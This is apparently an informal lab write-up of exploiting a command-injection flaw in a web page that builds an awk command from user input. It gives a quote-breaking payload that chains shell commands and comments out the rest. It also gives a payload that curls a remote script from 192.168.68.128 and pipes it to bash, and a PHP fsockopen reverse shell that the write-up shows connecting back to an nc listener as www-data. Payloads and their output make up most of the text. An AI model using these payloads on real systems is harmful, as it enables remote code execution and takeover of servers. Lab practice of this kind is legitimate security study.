

lets
fucking 
GOOOOOOOOOOOOO

THE STEPS I TOOK

```
kali@kali ~> awk 'BEGIN {print sqrt(((-100)^2) + ((-200)^2))}'\n
223.607

kali@kali ~> awk 'BEGIN {print sqrt(((-100)^2) + ((-200'\n)^2))}'
fish: Unexpected ')' for unopened parenthesis
awk 'BEGIN {print sqrt(((-100)^2) + ((-200'\n)^2))}'
                                             ^

kali@kali ~> awk 'BEGIN {print sqrt(((-100)^2) + ((-200')^2))}'\n
fish: Unexpected ')' for unopened parenthesis
awk 'BEGIN {print sqrt(((-100)^2) + ((-200')^2))}'\n
                                           ^

kali@kali ~> awk 'BEGIN {print sqrt(((-100)^2) + ((-200')^2))}
fish: Unexpected ')' for unopened parenthesis
awk 'BEGIN {print sqrt(((-100)^2) + ((-200')^2))}
                                           ^

kali@kali ~> awk 'BEGIN {print sqrt(((-100)^2) + ((-200)^2))}'\n
223.607

kali@kali ~> awk 'BEGIN {print sqrt(((-200)^2) + ((-200)^2))}'\n )^2))}'
fish: Unexpected ')' for unopened parenthesis
awk 'BEGIN {print sqrt(((-200)^2) + ((-200)^2))}'\n )^2))}'
                                                    ^

kali@kali ~> awk 'BEGIN {print sqrt(((-200)^2) + ((-200)^2))}'\n # )^2))}'
282.843

kali@kali ~> awk 'BEGIN {print sqrt(((-200)^2) + ((-200)^2))}'\n #)^2))}'

```


Final payload, just paste this and life is good

```
200)^2))}';whoami #
```

there is probably  a simpler way, my idea was to basically finish the command myself and then comment out the rest of the command and run anything else I wanted, which worked. I had essentially added a hashtag and that nullified the rest of the code hence letting me chain it towards whatever i would like.

It turned out the `\n` character was unnecessary, all that was needed was the `#` to comment out the rest of the code


result

```
Executed: awk 'BEGIN {print sqrt(((-200)^2) + ((-200)^2))}' #)^2))}'
Result: 282.843

Executed: awk 'BEGIN {print sqrt(((-100)^2) + ((-200)^2))}';whoami #)^2))}'
Result: 223.607 www-data

Executed: awk 'BEGIN {print sqrt(((-100)^2) + ((-200)^2))}';pwd #)^2))}'
Result: 223.607 /var/www/html/labs

```


## Reverse shell

Reverse shell payload
```
200)^2))}';curl http://192.168.68.128:8000/stuff.sh|bash #
```

Result on webpage!
```
Executed: awk 'BEGIN {print sqrt(((-100)^2) + ((-200)^2))}';curl http://192.168.68.128:8000/stuff.sh|bash #)^2))}'
Result: 223.607
```

**DISCLAIMER**: MAKE SURE TO HAVE A SPACE BEFORE THE TERMINATOR OR ELSE IT WONT WORK


### PHP revshell

```
Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-200)^2))}';which php #)^2))}'
Result: 234.796 /usr/local/bin/php
```

so now that we know the application is there we know the payload is going to be 

```
200)^2))}';/usr/local/bin/php -r '$sock=fsockopen("192.168.68.128",4343);exec("/bin/sh -i <&3 >&3 2>&3");' #
```

```
kali@kali ~> nc -nvlp 4343
listening on [any] 4343 ...
connect to [192.168.68.128] from (UNKNOWN) [172.18.0.4] 37120
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/html/labs

```